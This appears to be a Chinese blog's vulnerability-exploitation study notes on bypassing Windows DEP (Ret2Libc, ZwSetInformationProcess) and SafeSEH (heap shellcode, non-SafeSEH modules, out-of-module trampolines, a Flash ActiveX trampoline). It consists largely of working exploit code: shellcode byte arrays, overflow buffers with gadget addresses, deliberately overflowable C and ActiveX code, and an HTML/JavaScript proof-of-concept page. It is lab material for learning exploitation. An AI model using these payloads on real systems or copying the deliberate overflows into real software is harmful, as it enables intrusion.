NX_COMPAT标识，位于IMAGE_OPTIONAL_HEADER中的DllCharacteristics，此值为0x100时表示启用DEP\n利用Ret2Libc挑战DEP 原理 DEP保护时溢出失败的原因是DEP检测到代码在非可执行页上执行，如果让程序直接跳转到一个已存在的系统函数中，必然不会被拦截 Ret2Libc是Return-to-libc的简写，如果将每条exploit都找到一条在系统lib中的替代品，那么此exp一定可以正确执行，但问题在于不是每条指令都不包含0，不断的跳转容易跳错地方 以下是三个可行的方法 跳转到ZwSetinfomationProcess函数将DEP关闭，转入shellcode执行 跳转到VirtualProtect将shellcode页面设为可执行，随后转入shellcode执行 跳转到VirtualAlloc申请一段可执行的内存空间随后跳入shellcode执行 尝试ZwSetinfomationProcess关闭DEP 前置内容 一个进程的DEP标识存在于KPROCESS结构的_KEXECUTE_OPTION上，可以通过API函数修改 _KEXECUTE_OPTION结构\n1 2 3 4 5 6 7 Pos0ExecuteDisable:1bit Pos1ExecuteEnable:1bit Pos2DisableThunkEmulation:1bit Pos3Permanent:1bit Pos4ExecuteDispatchEnable:1bit Pos5ImageDispatchEnable:1bit Pos6Spare:2bit 当前进程DEP开启的时候，ExecuteDisable将会被设置为1 当前进程DEP关闭的时候，ExecuteEnable将会被设置为1 DisableThunkEmulation为了兼容ATL被设置 Permanent被置1后表示这些标志都不能再被修改 我们只要将_KEXECUTE_OPTIONS的值设置为0x02(00000010)就可以将ExecuteEnable置为1 shellcode原理 LdrpCheckNXCompatibility函数为了检查DEP兼容性，满足以下条件之一将可以关闭DEP DLL受SafeDisc版权保护系统保护 DLL中含有.aspack，.pcle，.sforce等字节的时候 DLL存在于注册表声明的不需启用DEP的模块的时候HKEY_LOCAL_MACHINE\\SOFTWARE \\Microsoft\\ Windows NT\\CurrentVersion\\Image File Execution Options\\DllNXOptions 代码 测试环境：系统：Windows XP SP3，DEP状态：Optout，编译器：VC6，编译选项：禁用优化，版本：release\n1 2 3 4 5 6 7 8 ULONG ExecuteFlags = MEM_EXECUTE_OPTION_ENABLE; ZwSetInformationProcess( NtCurrentProcess(), // Handle(-1) ProcessExecuteFlags, //0x22 \u0026amp;ExecuteFlags, // ptr to 0x2 sizeof(ExecuteFlags) //0x4 ); 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 #include \u0026lt;string.h\u0026gt; #include \u0026lt;windows.h\u0026gt; char shellcode[] = \u0026#34;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\u0026#34; \u0026#34;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\u0026#34; \u0026#34;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\u0026#34; \u0026#34;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\u0026#34; \u0026#34;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\u0026#34; \u0026#34;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\u0026#34; \u0026#34;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\u0026#34; \u0026#34;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\u0026#34; \u0026#34;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\u0026#34; \u0026#34;\\x53\\x68\\x6B\\x61\\x6F\\x6F\\x68\\x4D\\x69\\x73\\x61\\x8B\\xC4\\x53\\x50\\x50\u0026#34; \u0026#34;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x52\\xE2\\x92\\x7C\u0026#34; // mov eax, 1 \u0026#34;\\x96\\x73\\x1B\\x5D\u0026#34; // mov ebp, esp \u0026amp; esp+8 \u0026#34;\\x1E\\xAD\\x17\\x5D\u0026#34; // esp+0x24 \u0026#34;\\xB4\\xC1\\xC5\\x7D\u0026#34; // jmp esp \u0026#34;\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x24\\xCD\\x93\\x7C\u0026#34; // call Close DEP \u0026#34;\\x90\\x90\\xE9\\x2D\u0026#34; // jmp to shellcode start \u0026#34;\\xFF\\xFF\\xFF\\x90\u0026#34; ; void test() { char tt[176]; strcpy(tt,shellcode); } int main() { HINSTANCE hInst = LoadLibrary(\u0026#34;shell32.dll\u0026#34;); char temp[200]; test(); return 0; } 技术细节 需要对比al是否为1，所以第一步retn将会返回到mov eax, 1，retn的地址，此地址将会返回到修缮ebp的位置 因为在调用函数之前，会访问ebp中的值，但是它已经被刷写掉了，所以将修缮ebp，在此使用了push esp，pop ebp，retn三条指令将esp中的地址赋值给ebp，由于retn后面跟着数字，因此ebp将会加上这个数字，也就是ebp+8，此时ebp小于esp了，一旦调用子程序将会对栈区进行破坏，所以依旧得将ebp再加上一些，我在此选择将esp加上0x24，与之前的0x8凑成了0x30的栈空间，这样在返回的时候将会返回到语句retn 0x24 retn 0x24语句在返回的时候将会返回到调用关闭DEP的函数ZwSetInformationProcess的地方，调用完毕后将会使用leave语句并retn，因此它将会返回到jmp esp的地址处 由jmp esp跳转到\\x24\\xCD\\x93\\x7C数据存放的地址处，而此垃圾数据将不会影响shellcode的执行 在垃圾数据的后方写入一个跳转即可，至此跳到shellcode真实执行之处 ","date":"2020-11-19T12:42:00+08:00","permalink":"https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-014-dep%E7%9A%84%E4%BB%8B%E7%BB%8D/","title":"漏洞利用学习笔记-014-DEP的介绍"},{"content":"本文来源：Moeomu的博客\nSafeSEH简介 工作 检查异常处理链是否位于当前程序的栈中。如果不在当前栈中，程序将终止异常处理函数的调用。 检查异常处理函数指针是否指向当前程序的栈中。如果指向当前栈中，程序将终止异常处理函数的调用。 在前面两项检查都通过后，程序调用一个全新的函数RtlIsValidHandler()，来对异常处理函数的有效性进行验证，此函数的工作如下 判断异常处理函数地址是不是在加载模块的内存空间，如果属于加载模块的内存空间，校验函数将依次进行如下校验。 判断程序是否设置了IMAGE_DLLCHARACTERISTICS_NO_SEH标识。如果设置了这个标识，这个程序内的异常会被忽略。所以当这个标志被设置时，函数直接返回校验失败。 检测程序是否包含安全S.E.H表。如果程序包含安全S.E.H表，则将当前的异常处理函数地址与该表进行匹配，匹配成功则返回校验成功，匹配失败则返回校验失败。 判断程序是否设置ILonly标识。如果设置了这个标识，说明该程序只包含.NET编译中间语言，函数直接返回校验失败。 判断异常处理函数地址是否位于不可执行页(non-executable page)上。当异常处理函数地址位于不可执行页上时，校验函数将检测DEP是否开启，如果系统未开启DEP则返回校验成功，否则程序抛出访问违例的异常。 如果异常处理函数的地址没有包含在加载模块的内存空间，校验函数将直接进行DEP相关检测，函数依次进行如下校验。 判断异常处理函数地址是否位于不可执行页(non-executable page)上。当异常处理函数地址位于不可执行页上时，校验函数将检测DEP是否开启，如果系统未开启DEP则返回校验成功，否则程序抛出访问违例的异常。 判断系统是否允许跳转到加载模块的内存空间外执行，如果允许则返回校验成功，否则返回校验失败。 RtlIsValidHandler()函数检测流程图\n可行性分析 异常处理函数位于加载模块内存范围之外，DEP关闭 异常处理函数位于加载模块内存范围之内，相应模块未启用SafeSEH(安全S.E.H表为空)，同时相应模块不是纯IL 异常处理函数位于加载模块内存范围之内，相应模块启用SafeSEH(安全S.E.H表不为空)，异常处理函数地址包含在安全S.E.H表中 终极方案：将shellcode布置在堆区，即使SEH验证不可行仍旧会调用\n堆中绕过SEH 代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; char shellcode[] = \u0026#34;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\u0026#34; \u0026#34;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\u0026#34; \u0026#34;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\u0026#34; \u0026#34;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\u0026#34; \u0026#34;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\u0026#34; \u0026#34;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\u0026#34; \u0026#34;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\u0026#34; \u0026#34;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\u0026#34; \u0026#34;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\u0026#34; \u0026#34;\\x53\\x68\\x6B\\x61\\x6F\\x6F\\x68\\x4D\\x69\\x73\\x61\\x8B\\xC4\\x53\\x50\\x50\u0026#34; \u0026#34;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; ; char overflowcode[] = \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\xE0\\xFF\\x12\\x90\u0026#34; \u0026#34;\\x08\\x3E\\x39\\x00\u0026#34; // address of shellcode in heap ; ; void test(char * input) { char str[200]; strcpy(str, input); int zero = 0; zero = 1 / zero; } void main() { char* buf = (char *)malloc(500); strcpy(buf, shellcode); test(overflowcode); } 说明 将shellcode放入堆区 栈溢出，将SEH链地址覆写为堆区shellcode的地址 调用SEH，随后自动触发shellcode 注意：注意0的情况，字符串复制是遇到0截止的\n利用未启用SafeSEH的模块来绕过SafeSEH 代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 // SEH_NOSafeSEH_JUMP.DLL # include \u0026lt;windows.h\u0026gt; BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) { return TRUE; } void jump() { __asm { pop eax pop eax retn } } // SEH_NOSafeSEH.EXE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;windows.h\u0026gt; char shellcode[] = \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\xEB\\x0E\\x90\\x90\u0026#34; // 220 Byte NOP, retn here, jmp to shellcode \u0026#34;\\x81\\x11\\x12\\x11\u0026#34; // address of pop pop retn in No_SafeSEH module \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; // to prevent SEH chain stack overfill // shellocode \u0026#34;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\u0026#34; \u0026#34;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\u0026#34; \u0026#34;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\u0026#34; \u0026#34;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\u0026#34; \u0026#34;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\u0026#34; \u0026#34;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\u0026#34; \u0026#34;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\u0026#34; \u0026#34;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\u0026#34; \u0026#34;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\u0026#34; \u0026#34;\\x53\\x68\\x6B\\x61\\x6F\\x6F\\x68\\x4D\\x69\\x73\\x61\\x8B\\xC4\\x53\\x50\\x50\u0026#34; \u0026#34;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\u0026#34; ; DWORD MyException(void) { printf(\u0026#34;There is an exception\u0026#34;); getchar(); return 1; } void test(char* input) { char str[200]; strcpy(str, input); int zero = 0; // prevent overfill, palce it to strcpy back __try { zero = 1 / zero; } __except(MyException()){} } int main() { HINSTANCE hInst = LoadLibrary(TEXT(\u0026#34;SEH_NOSafeSEH_JUMP.dll\u0026#34;)); // load No_SafeSEH module char str[200]; test(shellcode); return 0; } 实验思路 使用VC6编译SEH_NOSafeSEH_JUMP.DLL，这样SEH_NOSafeSEH_JUMP.DLL将不会启用SafeSEH，使用release模式 使用VS2008编译SEH_NOSafeSEH.EXE，这样SEH_NOSafeSEH.EXE将会启用SafeSEH，使用release模式，编译设置为无优化 SEH_NOSafeSEH.EXE的test函数存在明显的栈溢出漏洞，同样要求是shellcode中不能存在0 SEH被覆盖后，制造除0异常，劫持异常处理流程 提前处理 由于VC++ 6.0编译的DLL默认加载基址为0x10000000，如果以它作为DLL的加载基址，DLL中pop pop retn指令地址中可能会包含0x00，这会在我们进行strcpy操作时会将字符串截断影响我们shellcode的复制，所以为了方便测试我们需要对基址进行重新设置。在顶部菜单中选择“工程→设置”，然后切换到“连接”选项卡，在“工程选项”的输入框中添加/base:\u0026quot;0x11120000\u0026quot;即可。 遇到的问题 跳板将会跳到shellcode中地址的前方4字节处，所以应当将此处放入jmp 经过VS 2008编译的程序，在进入含有__try{}的函数时会在Security Cookie+4的位置压入−2(VC++ 6.0下为−1)，在程序进入__try{}区域时程序会根据该__try{}块在函数中的位置而修改成不同的值。例如，函数中有两个__try{}块，在进入第一个__try{}块时这个值会被修改成0，进入第二个的时候被修改为1。如果在__try{}块中出现了异常，程序会根据这个值调用相应的__except()处理，处理结束后这个位置的值会重新修改为−2;如里没有发生异常，程序在离开__try{}块时这个值也会被修改回−2。当然这个值在异常处理时还有其他用途。我们只需要知道由于它的存在，我们的 shellcode可能会被破坏，所以在模块地址之后应该放入八个字节的NOP作为保护措施。 从retn回栈地址空间到shellcode本体之间有四个字节的不和谐因素，因此我们需要跳转到shellcode中执行 利用加载模块以外的地址绕过SafeSEH 所有的模块都默认开启了SafeSEH\n跳板 地址 反汇编代码 call/jmpdword ptr[esp+0x8] call/jmpdword ptr[esp+0x14] call/jmpdword ptr[esp+0x1c] call/jmpdword ptr[esp+0x2c] call/jmpdword ptr[esp+0x44] call/jmpdword ptr[esp+0x50] call/jmp dword ptr[ebp+0xc] call/jmp dword ptr[ebp+0x24] call/jmp dword ptr[ebp+0x30] call/jmp dword ptr[ebp-0x4] call/jmp dword ptr[ebp-0xc] call/jmp dword ptr[ebp-0x18] 代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;windows.h\u0026gt; char shellcode[] = // shellcode start \u0026#34;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\u0026#34; \u0026#34;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\u0026#34; \u0026#34;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\u0026#34; \u0026#34;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\u0026#34; \u0026#34;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\u0026#34; \u0026#34;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\u0026#34; \u0026#34;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\u0026#34; \u0026#34;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\u0026#34; \u0026#34;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\u0026#34; \u0026#34;\\x53\\x68\\x6B\\x61\\x6F\\x6F\\x68\\x4D\\x69\\x73\\x61\\x8B\\xC4\\x53\\x50\\x50\u0026#34; \u0026#34;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\u0026#34; // shellcode end \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; \u0026#34;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\u0026#34; // will be overfile with 00000000 00000000 by {__try __catch} \u0026#34;\\xE9\\x2B\\xFF\\xFF\\xFF\\x90\\x90\\x90\u0026#34; // far jump and nop \u0026#34;\\xEB\\xF6\\x90\\x90\u0026#34; // short jump and nop \u0026amp; return here \u0026#34;\\x0B\\x0B\\x29\\x00\u0026#34; // address of call [ebp+30] in outside memory ; DWORD MyException(void) { printf(\u0026#34;There is an exception\u0026#34;); getchar(); return 1; } void test(char* input) { char str[200]; strcpy(str, input); int zero = 0; __try { zero = 1 / zero; } __except(MyException()){} } int main() { test(shellcode); return 0; } 漏洞执行流程 缓冲区溢出覆盖SEH链处理地址为模块外的地址绕过SafeSEH 在0x00290B0B处找到了一条call [ebp+0x30]的指令，使用它为跳板跳入shellcode 面临的问题 0x00290B0B包含字节0x00，strcpy复制时遇到它将会终止 解决办法：00不能缺，就让它变成shellcode的末尾算了\n和上一节一样的问题，经过VS 2008编译的程序，在进入含有__try{}的函数时会在Security Cookie+4的位置压入−2，它将会破坏shellcode，因此我们需要跳过它，它将会覆盖的位置代码中写入了，因此我们要使用它下方的12个字节跳转到真正shellcode的入口，因此要使用两次跳转跳到入口，第一次跳转是为了跳到长跳，第二次的长跳转是为了跳入shellcode 利用Adobe Flash Player ActiveX控件绕过SafeSEH 原理 其实这种方法就是利用未启用SafeSEH模块绕过SafeSEH的浏览器版。Flash Player ActiveX 在9.0.124之前的版本不支持SafeSEH，所以如果我们能够在这个控件中找到合适的跳板地址，就完全可以绕过SafeSEH。\nFlash插件作为找跳板的模块，因为它未启用安全SEH 我们构造代码模块造成栈溢出漏洞 构造POC html页面调用我们构造的漏洞代码 我们的代码模块溢出覆盖SEH链后，将会跳入我们准备好的Flash代码跳板处 从Flash代码跳板处跳入我们栈区的shellcode 漏洞利用成功 代码 下载IE7-for-XP-x86-中文安装包 下载Flash Player ActiveX v9.0.124安装包 创建一个MFC ActiveX控件，我将我创建的工程打包了一份，在此下载 详细设置图 使用Unicode字符集，禁用编译优化选项，在静态库中使用MFC，使用release版本编译 1 2 3 4 5 6 7 8 void CVulnerAX_SEHCtrl::test(LPCTSTR str) { //AFX_MANAGE_STATE(AfxGetStaticModuleState()); // TODO: 在此添加调度处理程序代码 printf(\u0026#34;moeomu\u0026#34;); //定位该函数的标记 char dest[100]; sprintf(dest, \u0026#34;%s\u0026#34;, str); } VulnerAX_SEH.idl中CVulnerAX_SEHCtrl的类信息的UUID：ACA3927C-6BD1-4B4E-8697-72481279AAEC 其它步骤 注册控件：Regsvr32 路径\\控件名.ocx 注册好后我们可以在web页面中以如下方式调用我们的函数 1 2 3 4 5 6 \u0026lt;object classid=\u0026#34;clsid:ACA3927C-6BD1-4B4E-8697-72481279AAEC\u0026#34; id=\u0026#34;test\u0026#34;\u0026gt; \u0026lt;/object\u0026gt; \u0026lt;script\u0026gt; test.test(\u0026#34;testest\u0026#34;); \u0026lt;/script\u0026gt; 触发漏洞 构造POC页面 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;object classid=\u0026#34;clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\u0026#34; codebase=\u0026#34;http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,28,0\u0026#34; width=\u0026#34;160\u0026#34; height=\u0026#34;260\u0026#34;\u0026gt; \u0026lt;param name=\u0026#34;movie\u0026#34; value=\u0026#34;1.swf\u0026#34; /\u0026gt; \u0026lt;param name=\u0026#34;quality\u0026#34; value=\u0026#34;high\u0026#34; /\u0026gt; \u0026lt;embed src=\u0026#34;1.swf\u0026#34; quality=\u0026#34;high\u0026#34; pluginspage=\u0026#34;http://www.adobe.com/shockwave/download/download.cgi?P1_Prod_Version=ShockwaveFlash\u0026#34; type=\u0026#34;application/x-shockwave-flash\u0026#34; width=\u0026#34;160\u0026#34; height=\u0026#34;260\u0026#34;\u0026gt; \u0026lt;/embed\u0026gt; \u0026lt;/object\u0026gt; \u0026lt;object classid=\u0026#34;clsid:ACA3927C-6BD1-4B4E-8697-72481279AAEC\u0026#34; id=\u0026#34;test\u0026#34;\u0026gt; \u0026lt;/object\u0026gt; \u0026lt;script\u0026gt; var shellcode = \u0026#34;\u0026#34;; var s = \u0026#34;\\u9090\u0026#34;; while (s.length \u0026lt; 54) { s += \u0026#34;\\u9090\u0026#34;; } s += \u0026#34;\\u3001\\u3008\u0026#34;; s += shellcode; test.test(s); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 分析 如图，ecx指向的地址0x01DCF4FC是溢出字符串的起始地址，距离栈顶最近的异常函数地址位于0x01DCF610，计算得填充0x114也就是276字节即可覆盖到异常处理函数地址，而第277-280字节放置跳板即可 使用OllyFindAddr插件的Overflow return address-\u0026gt;Find CALL/JMP[EBP+N]选项查找指令，本次实验找到了0x300B2D1C的CALL [EBP+0xC]作为跳板，如图 根据前面的计算把跳板地址放到shellcode相应位置中，保存POC页面，test更改函数如下 1 2 3 4 5 6 7 8 9 \u0026lt;script\u0026gt; var s = \u0026#34;\\u9090\u0026#34;; while (s.length \u0026lt; 138) { s += \u0026#34;\\u9090\u0026#34;; } s += \u0026#34;\\u2D1C\\u300B\u0026#34;; test.test(s); \u0026lt;/script\u0026gt; 